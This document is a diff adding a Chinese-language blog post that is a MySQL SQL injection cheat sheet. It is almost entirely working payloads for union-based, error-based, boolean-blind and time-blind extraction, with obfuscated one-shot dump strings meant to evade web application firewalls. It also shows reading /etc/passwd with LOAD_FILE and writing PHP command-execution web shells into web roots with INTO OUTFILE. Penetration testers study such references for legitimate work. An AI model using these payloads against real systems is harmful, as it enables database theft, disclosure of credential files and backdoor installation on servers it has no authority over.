@@ -1,0 +1,629 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>SQL 注入 - Mysql | Zer0-hex&#39;s Blog</title>
+
+<link rel="shortcut icon" href="https://Zer0-hex.github.io/favicon.ico?v=1694759377248">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://Zer0-hex.github.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Zer0-hex&#39;s Blog
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/firends" class="menu gt-a-link" target="_blank">
+                            友链
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1694759377248" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    SQL 注入 - Mysql
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-04-10 ·
+                    </time>
+                    
+                        <a href="https://Zer0-hex.github.io/S_pJMT0Cy/" class="post-tags">
+                            # 渗透测试
+                        </a>
+                    
+                        <a href="https://Zer0-hex.github.io/9ABIEQaCbY/" class="post-tags">
+                            # SQL 注入
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="0x0-mysql-基础语句">0x0 Mysql 基础语句</h2>
+<ul>
+<li>注释</li>
+</ul>
+<pre><code class="language-text"># MYSQL 注释
+-- 注释 [两个 - 后面加一个空格]
+/* MYSQL 注释 */
+/*!32302 10*/ MYSQL 3.23.02 版本的注释
+/*! MYSQL 特殊 SQL */
+</code></pre>
+<ul>
+<li>查询语句</li>
+</ul>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;
+$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;;
+$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username='$username' and users.password='$password' ORDER BY users.id DESC LIMIT 0,1&quot;;
+$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;
+
+</code></pre>
+<ul>
+<li>插入语句</li>
+</ul>
+<pre><code class="language-php">$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
+</code></pre>
+<ul>
+<li>更新语句</li>
+</ul>
+<pre><code class="language-php">$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;;
+</code></pre>
+<ul>
+<li>删除语句</li>
+</ul>
+<pre><code class="language-php">$sql = &quot;delete from student where id = $id&quot;
+$sql = &quot;delete from student where id in ($id1, $id2, $id3)&quot;
+</code></pre>
+<h2 id="0x1-基于-union-的联合注入">0x1 基于 Union 的联合注入</h2>
+<blockquote>
+<p>一般用于查询语句的注入</p>
+</blockquote>
+<h3 id="检查列数">检查列数</h3>
+<blockquote>
+<p>联合注入需要知道查询语句显示的列数，可以用以下方法去判断</p>
+</blockquote>
+<ul>
+<li>order by</li>
+</ul>
+<pre><code class="language-text">1' ORDER BY 1--+		#True
+1' ORDER BY 2--+		#True
+1' ORDER BY 3--+		#True
+1' ORDER BY 4--+		#False - 可以判断，被注入语句查询结果有三列
+-1' UNION SELECT 1,2,3--+	# True
+</code></pre>
+<ul>
+<li>group by</li>
+</ul>
+<pre><code class="language-text">1' GROUP BY 1--+		#True
+1' GROUP BY 2--+		#True
+1' GROUP BY 3--+		#True
+1' GROUP BY 4--+		#False - 可以判断，被注入语句查询结果有三列
+-1' UNION SELECT 1,2,3--+	# True
+</code></pre>
+<h4 id="如果目标启用了错误显示">如果目标启用了错误显示</h4>
+<blockquote>
+<p>如果页面返回错误信息，可以构造语句让其显示语法错误，一般会显示需要的信息</p>
+</blockquote>
+<ul>
+<li>order by 报错</li>
+</ul>
+<pre><code class="language-text">1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
+
+# 如果提示：Unknown column '4' in 'order clause'
+# 说明第 4 列不存在，那么得知只有三列。
+# -1' UNION SELECT 1,2,3--+	# True
+</code></pre>
+<ul>
+<li>group by 报错</li>
+</ul>
+<pre><code class="language-text">1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
+
+# 如果提示：Unknown column '4' in 'group statement'
+# 说明第 4 列不存在，那么得知只有三列。
+# -1' UNION SELECT 1,2,3--+	# True
+</code></pre>
+<ul>
+<li>union select 报错</li>
+</ul>
+<pre><code class="language-text">1' UNION SELECT @--+        	# 报错: The used SELECT statements have a different number of columns
+1' UNION SELECT @,@--+      	# 报错: The used SELECT statements have a different number of columns
+1' UNION SELECT @,@,@--+    	# 无报错，说明有 3 列
+-1' UNION SELECT 1,2,3--+	# True
+</code></pre>
+<ul>
+<li>limit into</li>
+</ul>
+<pre><code class="language-text">1' LIMIT 1,1 INTO @--+        	# 报错: The used SELECT statements have a different number of columns
+1' LIMIT 1,1 INTO @,@--+      	# 报错: The used SELECT statements have a different number of columns
+1' LIMIT 1,1 INTO @,@,@--+    	# 无报错，说明有 3 列
+-1' UNION SELECT 1,2,3--+	# True
+</code></pre>
+<ul>
+<li>select * from any_table</li>
+</ul>
+<pre><code class="language-text">1' AND (SELECT * FROM Users) = 1--+ 	
+# (select * from users) 会返回 users 表的列数，通过逻辑判断
+# 如果错误信息中包含：means query uses 3 column
+-1' UNION SELECT 1,2,3--+	# True
+</code></pre>
+<h3 id="获取数据">获取数据</h3>
+<h4 id="有-information_schema">有 information_schema</h4>
+<blockquote>
+<p>也可以 union all select，# 加上 all 可以显示所有结果，包括重复行。</p>
+</blockquote>
+<pre><code class="language-text"># 数据库
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
+# 表
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
+# 字段
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
+# 数据
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
+</code></pre>
+<h4 id="无-information_schema">无 information_schema</h4>
+<ul>
+<li>版本: Mysql &gt;= 4.1</li>
+</ul>
+<pre><code class="language-text"># 首先获取字段数
+?id=(1)and(SELECT * from db.users)=(1)
+-- 报错：Operand should contain 4 column(s)
+
+# 然后提取字段
+?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
+-- 报错：Column 'id' cannot be null
+</code></pre>
+<ul>
+<li>版本 Mysql = 5</li>
+</ul>
+<pre><code class="language-text"># 获取字段名
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
+-- #1060 - Duplicate column name 'id'
+
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
+-- #1060 - Duplicate column name 'name'
+
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
+...
+</code></pre>
+<h3 id="无字段名提取数据">无字段名提取数据</h3>
+<ul>
+<li>获取第 4 列数据</li>
+</ul>
+<pre><code class="language-text">select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
+</code></pre>
+<ul>
+<li>查询内注入</li>
+</ul>
+<pre><code class="language-text">select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+</code></pre>
+<h2 id="基于错误回显的报错注入">基于错误回显的报错注入</h2>
+<blockquote>
+<p>报错信息长度有限</p>
+</blockquote>
+<h3 id="基本的报错">基本的报错</h3>
+<ul>
+<li>版本: Mysql &gt;= 4.1</li>
+</ul>
+<pre><code class="language-text">(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+'+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+</code></pre>
+<h3 id="updatexml-函数报错">UpdateXML 函数报错</h3>
+<pre><code class="language-text">AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+</code></pre>
+<ul>
+<li>短一点的 Payload</li>
+</ul>
+<pre><code>' and updatexml(null,concat(0x0a,version()),null)-- -
+' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+</code></pre>
+<h3 id="extractvalue-函数报错">Extractvalue 函数报错</h3>
+<ul>
+<li>版本: Mysql &gt;= 5.1</li>
+</ul>
+<pre><code class="language-text">?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+</code></pre>
+<h3 id="name_const-函数报错">NAME_CONST 函数报错</h3>
+<blockquote>
+<p>查询语句的内容必须是常量，也就是确定的值，无法使用通过 SQL 语句得到的值</p>
+</blockquote>
+<ul>
+<li>版本 Mysql &gt;= 5.0</li>
+</ul>
+<pre><code class="language-text">?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
+</code></pre>
+<h2 id="mysql-布尔盲注">Mysql 布尔盲注</h2>
+<blockquote>
+<p>通过观察页面是否发生变化来判断</p>
+</blockquote>
+<ul>
+<li>通过字符串比较</li>
+</ul>
+<pre><code class="language-text">?id=1 and substring(version(),1,1)=5
+?id=1 and right(left(version(),1),1)=5
+?id=1 and left(version(),1)=4
+?id=1 and ascii(lower(substr(Version(),1,1)))=51
+?id=1 and (select mid(version(),1,1)=4)
+?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'
+?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A'
+</code></pre>
+<ul>
+<li>order by &amp; 正则表达式 &amp; then</li>
+</ul>
+<pre><code class="language-text">[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP &quot;^[BRUTEFORCE CHAR BY CHAR].*&quot; AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
+</code></pre>
+<ul>
+<li>then &amp; 正则表达式</li>
+</ul>
+<pre><code class="language-text">' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- -
+
+# SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- -';
+</code></pre>
+<ul>
+<li>if 条件盲注</li>
+</ul>
+<pre><code class="language-text">2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+Response:	# 
+HTTP/1.1 500 Internal Server Error
+
+2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
+Response:
+HTTP/1.1 200 OK
+</code></pre>
+<ul>
+<li>make_set 盲注</li>
+</ul>
+<pre><code class="language-text">AND MAKE_SET(YOLO&lt;(SELECT(length(version()))),1)
+AND MAKE_SET(YOLO&lt;ascii(substring(version(),POS,1)),1)
+AND MAKE_SET(YOLO&lt;(SELECT(length(concat(login,password)))),1)
+AND MAKE_SET(YOLO&lt;ascii(substring(concat(login,password),POS,1)),1)
+</code></pre>
+<ul>
+<li>Like 盲注, '_' 匹配</li>
+</ul>
+<pre><code class="language-text">SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
+</code></pre>
+<h2 id="mysql-时间盲注">Mysql 时间盲注</h2>
+<ul>
+<li>在子查询中 sleep</li>
+</ul>
+<pre><code class="language-text">1 and (select sleep(10) from dual where database() like '%')#
+1 and (select sleep(10) from dual where database() like '___')# 
+1 and (select sleep(10) from dual where database() like '____')#
+1 and (select sleep(10) from dual where database() like '_____')#
+1 and (select sleep(10) from dual where database() like 'a____')#
+...
+1 and (select sleep(10) from dual where database() like 's____')#
+1 and (select sleep(10) from dual where database() like 'sa___')#
+...
+1 and (select sleep(10) from dual where database() like 'sw___')#
+1 and (select sleep(10) from dual where database() like 'swa__')#
+1 and (select sleep(10) from dual where database() like 'swb__')#
+1 and (select sleep(10) from dual where database() like 'swi__')#
+...
+1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
+</code></pre>
+<ul>
+<li>使用条件语句</li>
+</ul>
+<pre><code class="language-text">?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))&gt;=100,1, BENCHMARK(2000000,MD5(NOW()))) --
+?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))&gt;=100, 1, SLEEP(3)) --
+?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+</code></pre>
+<h2 id="mysql-一次性转储-disposable-dump">Mysql 一次性转储 (disposable dump)</h2>
+<pre><code class="language-text">(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] &gt; ',table_name,' &gt; ',column_name,0x7C))))a)#
+
+(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] &gt; ',column_data2,' &gt; ',0x7C))))a)#
+
+-- SecurityIdiots
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+-- Profexer
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+
+-- Dr.Z3r0
+(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
+
+-- M@dBl00d
+(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+
+-- Zen
++make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+-- Zen WAF
+(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
+
+-- ~tr0jAn WAF
++concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+
+
+-- ~tr0jAn Benchmark
++concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name&gt;@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name&gt;@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name&gt;@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+
+
+-- N1Z4M WAF
++/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+
+
+-- sharik
+(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
+</code></pre>
+<h2 id="mysql-查看当前查询">Mysql 查看当前查询</h2>
+<pre><code class="language-text">union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
+
+-- Dump in one shot example for the table content.
+union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
+</code></pre>
+<h2 id="mysql-读取文件内容">Mysql 读取文件内容</h2>
+<blockquote>
+<p>需要 file-priv，否则会有报错: <code>ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p>
+</blockquote>
+<pre><code class="language-text">' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
+</code></pre>
+<ul>
+<li>如果已连接数据库，可以重新启用LOAD_FILE</li>
+</ul>
+<pre><code class="language-text">GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
+</code></pre>
+<h2 id="mysql-getshell">Mysql GetShell</h2>
+<ul>
+<li>输出 Shell 到文件</li>
+</ul>
+<pre><code class="language-text">[...] UNION SELECT &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; into outfile &quot;C:\\xampp\\htdocs\\backdoor.php&quot;
+[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '&lt;?php phpinfo();?&gt;'
+[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
+[...] union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET['cmd']);?&gt;&quot;,6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+</code></pre>
+<ul>
+<li>Dump Shell 到文件</li>
+</ul>
+<pre><code class="language-text">[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
+</code></pre>
+<h2 id="mysql-截断">Mysql 截断</h2>
+<blockquote>
+<p>主要与 sql-mode 的值有关<br>
+默认(非严格模式)：default，<br>
+非严格模式：&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;<br>
+严格模式：：&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES&quot;<br>
+在非严格模式下，如果插入数据超过已设置长度，则会警告而不是报错。</p>
+</blockquote>
+<pre><code class="language-text">select @@sql_mode	# 查看数据库模式
+`username` varchar(20) not null
+</code></pre>
+<p>利用：<code>username = &quot;admin     a&quot;</code> 加入空格填充长度，使最后一个a被截断，则成功插入admin用户</p>
+<h2 id="mysql-快速利用">Mysql 快速利用</h2>
+<blockquote>
+<p>使用 json_arrayagg 代替 group_concat，json_arrayagg 可以允许超过16000000个符号，group_concat 仅允许1024 个符号</p>
+</blockquote>
+<ul>
+<li>版本 Mysql &gt;= 5.7.22</li>
+</ul>
+<pre><code class="language-text">SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
+</code></pre>
